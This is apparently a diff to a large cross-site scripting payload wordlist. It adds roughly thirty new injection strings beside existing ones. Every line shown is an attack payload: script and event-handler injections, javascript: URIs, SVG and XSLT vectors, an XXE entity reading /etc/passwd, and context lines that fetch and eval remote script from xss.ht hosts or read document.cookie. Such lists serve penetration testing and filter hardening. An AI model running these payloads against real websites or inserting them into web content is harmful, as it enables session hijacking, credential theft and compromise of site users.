@@ -2924,6 +2924,7 @@ ${alert(1337)}`' autofocus
 <!--[if<img src=x:x onerror=confirm(5)//]-->
 <!--[if]><script>alert(1)</script -->
 <!--[if]><script>alert(1)</script --> <!--[if<img src=x onerror=alert(1)//]> -->
+<!--[if]><script>alert(1)</script --><!--[if<img src=x onerror=alert(1)//]> -->
 <!--[if]><script>alert(1)</script --><!--[if<img src=x onerror=alert(2)//]> -->
 <!--[if]><script>alert(115)</script --><!--[if<img src=x onerror=alert(2)//]> -->
 <!--[if]><script>confirm(1)</script -->
@@ -3209,12 +3210,14 @@ ${alert(1337)}`' autofocus
 <?xml version="1.0" standalone="yes"?><!doctype ernw [ <!entity xxe system "file:///etc/passwd" > ]><svg width="500px" height="40px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">&xxe;</svg>
 <?xml version="1.0"?> x><payload><![cdata[<img src=x onerror=alert(1)>]]></payload></x>
 <?xml version="1.0"?><?xml-stylesheet type="text/xml" href="#stylesheet"?><!doctype doc [<!attlist xsl:stylesheet  id    id    #required>]><svg xmlns="http://www.w3.org/2000/svg">    <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/xsl/transform">        <xsl:template match="/">            <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(1)"></iframe>        </xsl:template>    </xsl:stylesheet>    <circle fill="red" r="40"></circle></svg>
+<?xml version="1.0"?><?xml-stylesheet type="text/xml" href="#stylesheet"?><!doctype doc [<!attlist xsl:stylesheet id id #required>]><svg xmlns="http://www.w3.org/2000/svg"> <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/xsl/transform"> <xsl:template match="/"> <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(1)"></iframe> </xsl:template> </xsl:stylesheet> <circle fill="red" r="40"></circle></svg>
 <?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="data:,%3cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/xsl/transform' id='xss'%3e%3cxsl:output method='html'/%3e%3cxsl:template match='/'%3e%3cscript%3ealert(1)%3c/script%3e%3c/xsl:template%3e%3c/xsl:transform%3e"?><root/>
 <?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="data:,%3cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/xsl/transform' id='xss'%3e%3cxsl:output method='html'/%3e%3cxsl:template match='/'%3e%3cscript%3ealert(66)%3c/script%3e%3c/xsl:template%3e%3c/xsl:transform%3e"?><root/>
 <?xml version="1.0"?><change-log><text><script>alert(1)</script></text></change-log>
 <?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>alert(document.cookie);</html:script></html:html>
 <?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>
 <?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(8554);</html:script></html:html>
+<?xml-stylesheet href="javascript:alert(1)"?>
 <?xml-stylesheet href="javascript:alert(1)"?><root/>
 <?xml-stylesheet href="javascript:alert(17)"?><root/>
 <?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>
@@ -3439,6 +3442,7 @@ ${alert(1337)}`' autofocus
 <a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">click me</a><select><noembed></select><script x='a@b'a>y='a@b'//a@b%0a\u0061lert(1)</script x>
 <a href="feed:javascript&colon;alert(1)">click</a> firefox
 <a href="file:///applications/calculator.app"><svg onload="this.parentnose.click()"></a>
+<a href="http://attacker.org"> <iframe src="http://example.org/"></iframe></a>
 <a href="http://attacker.org"><iframe src="http://example.org/"></iframe></a>
 <a href="http://www.gohttp://www.google.com/ogle.com/">xss</a>"-prompt(8)-"
 <a href="invalid:1" id=x name=y>test</a><a href="invalid:2" id=x name=y>test</a><script>alert(x.y[0])</script>
@@ -3530,6 +3534,7 @@ ${alert(1337)}`' autofocus
 <a href="javascript:_e({}, 'cvml', 'test-01-%27-alert(1)-%27');" target="_blank">test</a>
 <a href="javascript:alert(1)" onmouseover=alert(1)>injectx hover</a>
 <a href="javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,event:click%0adata:xxx%0a%0a" /></a>
+<a href="javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,event:click%0adata:xxx%0a%0a">
 <a href="javascript:alert(1)">Click Me</a>
 <a href="javascript:alert(1)">ssss</a>
 <a href="javascript:alert(74)"><event-source src="data:application/x-dom-event-stream,event:click%0adata:xxx%0a%0a" /></a>
@@ -3661,6 +3666,7 @@ ${alert(1337)}`' autofocus
 <a onpointerrawupdate=alert(1) style=display:block>xss</a>
 <a onpointerup=alert(1) style=display:block>xss</a>
 <a onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></a>
+<a style="-o-link:'javascript:alert(1)';-o-link-source:current">x
 <a style="-o-link:'javascript:alert(1)';-o-link-source:current">x</a>
 <a style="-o-link:'javascript:alert(9)';-o-link-source:current">x</a>
 <a style="-o-link:'javascript:javascript:alert(1)';-o-link-source:current">x
@@ -3734,6 +3740,7 @@ ${alert(1337)}`' autofocus
 <a target=_blank href="https://vulnerabledoma.in/char_test?xss=0&body=<div onfocus=alert(1) style=writing-mode:rl-bt id=xss>#xss">writing-mode:rl-bt</a>
 <a target=_blank href="https://vulnerabledoma.in/char_test?xss=0&body=<div onfocus=alert(1) style=writing-mode:tb-lr id=xss>#xss">writing-mode:tb-lr</a>
 <a target=_blank href="https://vulnerabledoma.in/char_test?xss=0&body=<div onfocus=alert(1) style=writing-mode:tb-rl id=xss>#xss">writing-mode:tb-rl</a>
+<a x="javasc&#x0aript:alert(1)" style="\000062\00065\68\0\00 \&#xa0\000061 vio\r:url\28#default#time2);\-\\\00006d\0006f\7a\2d \62 \000069 \06e din\g:url(test.xbl#xss);\-\00006f\0002d\6c\69 \6e \00006b:attr(x);\-\00006f\0002d\6c\69 \6e \00006b-s\ource:current" end=0 onend=alert(1)>xxx
 <a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(87)"><rect width="1000" height="1000" fill="white"/></a>
 <a"'%0a`= +%20>;test<a"'%0a`= +%20>?test<a"'%0a`= +%20>;&x="><img src=x onerror=prompt(1);>#"><img src=x onerror=prompt(1);>test<a"'%0a`= +%20>;
 <a$href="data:text/html,%style=""3cscript>confirm((1)</sstyle=""cript>" onerror=>hello
@@ -4597,6 +4604,7 @@ ${alert(1337)}`' autofocus
 <b/alt="1"onmouseover=inputbox+1 language=vbs>test</b>
 <b/alt="1"onmouseover=inputbox+1language=vbs>x</b>
 <b="<script>confirm(1)</script>">
+<b><script<b></b><alert(1)</script </b>
 <b><script<b></b><alert(1)</script </b></b>
 <b><script<b></b><alert(58)</script </b></b>
 <b>drag and drop one of the following strings to the drop box:</b><br/><hr/>javascript:alert('top page location: '+document.location+' host page cookies: '+document.cookie);//<br/><hr/>feed:javascript:alert('top page location: '+document.location+' host page cookies: '+document.cookie);//<br/><hr/>feed:data:text/html,&#x3c;script>alert('top page location: '+document.location+' host page cookies: '+document.cookie)&#x3c;/script>&#x3c;b><br/><hr/>feed:feed:javascript:javascript:feed:alert('top page location: '+document.location+' host page cookies: '+document.cookie);//<br/><hr/><div id="dropbox" style="height: 360px;width: 500px;border: 5px solid #000;position: relative;" ondragover="event.preventdefault()">+ drop box +</div>
@@ -7808,6 +7816,7 @@ ${alert(1337)}`' autofocus
 <div draggable="true" ondragleave="alert(1)">test</div>
 <div draggable="true" ondragstart="alert(1)" style=display:block>test</div>
 <div draggable="true" ondragstart="alert(1)">test</div>
+<div draggable="true" ondragstart="event.datatransfer.setdata('text/plain','malicious code');"> <h1>drop me</h1></div><iframe src="http://www.example.org/drophere.html"></iframe>
 <div draggable="true" ondragstart="event.datatransfer.setdata('text/plain','malicious code');"><h1>drop me</h1></div><iframe src="http://www.example.org/drophere.html"></iframe>
 <div id="100"><img[a][b]src=x[d]onerror[c]=[e]"alert(100)">//["'`-->]]>]</div><div id="101"><a href="[a]java[b]script[c]:alert(101)">xxx</a>//["'`-->]]>]</div><div id="102"><img src="x` `<script>alert(102)</script>"` `>//["'`-->]]>]</div><div id="103"><script>history.pushstate(0,0,'/i/am/somewhere_else');</script>//["'`-->]]>]</div>
 <div id="104"><svg xmlns="http://www.w3.org/2000/svg" id="foo">
@@ -7859,7 +7868,9 @@ ${alert(1337)}`' autofocus
 <div id=d><div style="font-family:'sans\27\2f\2a\22\2a\2f\3b color\3ared\3b'">x</div></div> <script>with(document.getelementbyid("d"))innerhtml=innerhtml</script>
 <div id=d><div style="font-family:'sans\27\2f\2a\22\2a\2f\3b color\3ared\3b'">x</div></div><script>with(document.getelementbyid("d"))innerhtml=innerhtml</script>
 <div id=d><div style="font-family:'sans\27\3b color\3ared\3b'">x</div></div> <script>with(document.getelementbyid("d"))innerhtml=innerhtml</script>
+<div id=d><div style="font-family:'sans\27\3b color\3ared\3b'">x</div></div><script>with(document.getelementbyid("d"))innerhtml=innerhtml</script>
 <div id=d><x xmlns="><iframe onload=alert(1)"></div> <script>d.innerhtml=d.innerhtml</script>
+<div id=d><x xmlns="><iframe onload=alert(1)"></div><script>d.innerhtml=d.innerhtml</script>
 <div id=d><x xmlns="><iframe onload=alert(97)"></div>
 <div id=d><x xmlns="><iframe onload=alert(97)"></div><script>d.innerhtml+='';</script><div id=d><x xmlns='"><iframe onload=alert(2)//'></div><script>d.innerhtml+='';</script>
 <div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerhtml=d.innerhtml</script>
@@ -7941,6 +7952,7 @@ ${alert(1337)}`' autofocus
 <div style="background-image: url(&#1;javascript:alert(1))">
 <div style="background-image: url(&#1;javascript:alert(6481))">
 <div style="background-image: url(&#1;javascript:confirm(5))">
+<div style="background-image: url(&#1;javascript:document.cookie=true;)">
 <div style="background-image: url(&#1;javascript:document.vulnerable=true;)">
 <div style="background-image: url(javascript:alert('crosssitescripting'))">
 <div style="background-image: url(javascript:alert('xss'))">
@@ -7957,6 +7969,7 @@ ${alert(1337)}`' autofocus
 <div style="color:rgb(''&#0;x:expression(alert(1))"></div>
 <div style="color:rgb(''&#0;x:expression(alert(url=1))"></div> css and css :p
 <div style="color:rgb(''&#0;x:expression(confirm(url=1))"></div>
+<div style="list-style:url(http://foo.f)\20url(javascript:alert(1));">x
 <div style="list-style:url(http://foo.f)\20url(javascript:alert(1));">x</div>
 <div style="list-style:url(http://foo.f)\20url(javascript:alert(93));">x</div>
 <div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));">x
@@ -8091,6 +8104,7 @@ ${alert(1337)}`' autofocus
 <dl onpointerrawupdate=alert(1) style=display:block>xss</dl>
 <dl onpointerup=alert(1) style=display:block>xss</dl>
 <dl onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></dl>
+<doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml"> <html:style /><x xlink:href="javascript:alert(1)" xlink:type="simple">xxx</x></doc>
 <doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml"><html:style /><x xlink:href="javascript:alert(68)" xlink:type="simple">xxx</x></doc>
 <dt contenteditable onbeforeinput=alert(1)>test
 <dt draggable="true" ondrag="alert(1)" style=display:block>test</dt>
@@ -8774,6 +8788,7 @@ ${alert(1337)}`' autofocus
 <form id="test"></form><button form="test" formaction="javascript:alert(1)">x</button>
 <form id=frm><object id=x form=frm></object></form><script>alert(document.getelementbyid('x').form);</script>
 <form id=test /><button form=test formaction=javascript:alert(1)>
+<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>x
 <form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>x</button>
 <form id=test onforminput=alert(23)><input></form><button form=test onformchange=alert(2)>x</button>
 <form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>x
@@ -8851,6 +8866,7 @@ ${alert(1337)}`' autofocus
 <form><button formaction="javascript:alert(1)">
 <form><button formaction="javascript:alert(1)">//injectx
 <form><button formaction="javascript:alert(1)">Click Me</button></form>
+<form><button formaction="javascript:alert(1)">x
 <form><button formaction="javascript:alert(1)">x</button>
 <form><button formaction="javascript:alert(123)">crosssitespt
 <form><button formaction="javascript:alert(72)">x</button>
@@ -10175,6 +10191,7 @@ ${alert(1337)}`' autofocus
 <img src=" &#14;  javascript:alert(1);">
 <img src=" &#14;  javascript:alert(9113);">
 <img src=" &#14;  javascript:confirm(document.location);">
+<img src=" &#14; javascript:document.cookie=true;">
 <img src=" &#14; javascript:document.vulnerable=true;">
 <img src="" onerror="innerhtml=decodeuricomponent.call`${location.hash}`" "="">
 <img src="" onerror="location=/javascript:/.source+location" "="">
@@ -10277,6 +10294,7 @@ ${alert(1337)}`' autofocus
 <img src="javascript:alert('xss');">
 <img src="javascript:alert(1)"
 <img src="javascript:alert(1)">
+<img src="javascript:alert(1)"><image src="javascript:alert(1)"><script src="javascript:alert(1)">
 <img src="javascript:alert(1);"
 <img src="javascript:alert(1034);">
 <img src="javascript:alert(2)">
@@ -10299,6 +10317,7 @@ ${alert(1337)}`' autofocus
 <img src="mocha:alert(1);">
 <img src="mocha:document.cookie=true;">
 <img src="mocha:document.vulnerable=true;">
+<img src="x" alt="``onerror=alert(1)//"><div style="font-family:'foobar\27\3bx:expression(alert(2))/*';"></div>
 <img src="x:%90" title="onerror=alert(1)//">
 <img src="x:? title=" onerror=alert(1)//">
 <img src="x:alert" onerror="eval(src%2b'(1)')">
@@ -11599,6 +11618,7 @@ ${alert(1337)}`' autofocus
 <li style=list-style:url() onerror=alert(1)>
 <li style=list-style:url() onerror=alert(1)></li>
 <li style=list-style:url() onerror=alert(1)></li><div style=content:url(data:image/svg+xml,%3csvg/%3e);visibility:hidden onload=alert(1)></div>
+<li style=list-style:url() onerror=alert(1)><div style=content:url(data:image/svg+xml,%3csvg/%3e);visibility:hidden onload=alert(1)></div>
 <li style=list-style:url() onerror=alert(41)></li><div style=content:url(data:image/svg+xml,%3csvg/%3e);visibility:hidden onload=alert(41)></div>
 <li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3csvg/%%3e);visibility:hidden onload=javascript:alert(1)></div>
 <li style=list-style:url() onerror=javascript:alert(3719)> <div style=content:url(data:image/svg+xml,%%3csvg/%%3e);visibility:hidden onload=javascript:alert(3719)></div>
@@ -12073,6 +12093,7 @@ ${alert(1337)}`' autofocus
 <marquee><script>alert('xss')</script></marquee>
 <marquee>alert( `x :)`)</marquee>
 <math href="javascript:alert(1)">clickme</math><math><!-- up to ff 13 --><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">clickme</maction><!-- ff 14+ --><maction actiontype="statusline" xlink:href="javascript:alert(3)">clickme<mtext>http://http://google.com</mtext></maction></math>
+<math href="javascript:alert(1)">clickme</math><math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">clickme</maction></math>
 <math href="javascript:alert(130)">clickme</math><math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">clickme</maction><maction actiontype="statusline" xlink:href="javascript:alert(3)">clickme<mtext>http://http://google.com</mtext></maction></math>
 <math href="javascript:javascript:alert(1)">clickme</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">clickme</maction> </math>
 <math href="javascript:javascript:alert(3956)">clickme</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(3956)">clickme</maction> </math>
@@ -14974,6 +14995,7 @@ ${alert(1337)}`' autofocus
 <script>for(var i=0;i>=0;i++){alert(math.random()); alert(document.cookie);}</script>
 <script>function b(){eval(this.responsetext)};a=new xmlhttprequest();a.addeventlistener("load", b);a.open("get", "//hackeroneofjaaah.xss.ht");a.send();</script>
 <script>function b(){eval(this.responsetext)};a=new xmlhttprequest();a.addeventlistener("load", b);a.open("get", "//zero.xss.ht");a.send();</script>
+<script>function makepopups(){ for (i=1;i<6;i++) { window.open('popup.html','spam'+i,'width=50,height=50'); }}</script><body><a href="#" onclick="makepopups()">spam</a>
 <script>function makepopups(){for (i=1;i<6;i++){window.open('popup.html','spam'+i,'width=50,height=50');}}</script><body><a href="#" onclick="makepopups()">spam</a>
 <script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.xmlhttprequest();xhr.open('get', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responsetext.match(/cookie = '(.*?)'/)[1]) };xhr.send();
 <script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.xmlhttprequest();xhr.open('get', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { confirm(xhr.responsetext.match(/cookie = '(.*?)'/)[1]) };xhr.send();
@@ -17907,6 +17929,7 @@ ${alert(1337)}`' autofocus
 <style>li {list-style-image: url(\"javascript:alert('xss')\");}</style><ul><li>xss
 <style>li+{list-style-image:url("javascript:alert(1)");}</style><ul><li>1
 <style>p[foo=bar{}*{-o-link:'javascript:alert(1)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>
+<style>p[foo=bar{}*{-o-link:'javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>
 <style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>
 <style>p[foo=bar{}*{-o-link:'javascript:confirm(1)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>
 <style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>
@@ -18287,6 +18310,7 @@ ${alert(1337)}`' autofocus
 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><feimage><set attributename="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,phn2zyb4bwxucz0iahr0cdovl3d3dy53my5vcmcvmjawmc9zdmcipjxzy3jpchq%2bywxlcnqomsk8l3njcmlwdd48l3n2zz4ncg%3d%3d"/></feimage></svg>
 <svg xmlns="http://www.w3.org/2000/svg">
 <svg xmlns="http://www.w3.org/2000/svg"><a id="x"><rect fill="white" width="1000" height="1000"/></a><rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><a id="x"><rect fill="white" width="1000" height="1000"/></a><rect fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/></svg>
 <svg xmlns="http://www.w3.org/2000/svg"><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="1000" height="1000" fill="white"/></a></svg>
 <svg xmlns="http://www.w3.org/2000/svg"><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(87)"><rect width="1000" height="1000" fill="white"/></a></svg>
 <svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:\u0061lert(1);"></g></svg>
@@ -18584,6 +18608,7 @@ ${alert(1337)}`' autofocus
 <svg><style>&lt;img/src=x onerror=alert(128)// </b>
 <svg><style>&ltimg src=x onerror=alert(1)&gt</svg>
 <svg><style>&ltimg src=x onerror=confirm(1)&gt</svg>
+<svg><style>&ltimg/src=x onerror=alert(1)// </b>
 <svg><style>*{background:url('<![cdata[</style></svg><img title=');]]>]]></style></svg><iframe onload=alert(1)>'>
 <svg><style>*{font-family:'<svg onload=alert(1)>';}</style></svg>
 <svg><style>*{font-family:'<svg onload=confirm(1)>';}</style></svg>
@@ -19881,6 +19906,7 @@ ${alert(1337)}`' autofocus
 <video onprogress=alert(1)><source src=http://127.0.0.1:3555/xss_serve_payloads/x.ogg>
 <video onprogress=alert(1)><source src=x>
 <video onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></video>
+<video poster=javascript:alert(1)//
 <video poster=javascript:alert(1)//<video poster=javascript:alert(1)//></video>
 <video poster=javascript:alert(1)//></video>
 <video poster=javascript:alert(10)//></video>
@@ -20079,6 +20105,7 @@ ${alert(1337)}`' autofocus
 <x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
 <x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)"><x:timer value="1"/></x:template>
 <x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(83)"><x:timer value="1"/></x:template>
+<x:template xmlns:x="http://www.wapforum.org/2001/wml" x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)"><x:timer value="1"/></x:template>
 <xml id="crosssitescripting"><i><b><img src="javas<!-- -->cript:alert('crosssitescripting')"></b></i></xml>
 <xml id="crosssitescripting"><i><b><img src="javas<!-- -->cript:document.cookie=true"></b></i></xml><span datasrc="#crosssitescripting" datafld="b" dataformatas="html"></span>
 <xml id="x"><a><b><script>alert('xss');</script>;<b></a></xml>
